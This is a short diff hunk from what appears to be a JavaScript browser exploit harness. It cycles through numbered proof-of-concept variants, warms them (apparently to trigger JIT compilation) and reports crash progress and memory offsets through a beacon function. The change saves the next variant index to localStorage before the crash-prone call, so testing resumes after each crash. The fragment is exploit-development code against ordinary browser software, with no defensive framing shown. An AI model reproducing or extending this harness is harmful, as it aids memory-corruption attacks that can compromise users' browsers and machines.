@@ -773,9 +773,9 @@ poc0, poc1, poc2, poc3, poc4, poc5, poc6, poc7, poc8, poc9, poc10, poc11, poc12,
 // warm only the current variant (crash before others warmed is fine)
 warm(FNS[N]);
 beacon('shot', 'i=' + N + ' off=0x' + (0x100000000 + N * 0x20000000).toString(16));
+try { localStorage.setItem('esc5_i', String(N + 1)); } catch(e) {}
 try { FNS[N](35); } catch(e) { beacon('exc', String(e).slice(0,60)); }
 beacon('survived', 'i=' + N);
-try { localStorage.setItem('esc5_i', String(N + 1)); } catch(e) {}
 for (var b = 0; b < bufs.length; b++) {
   var u = bufs[b];
   for (var w2 = 0; w2 < u.length; w2++) {
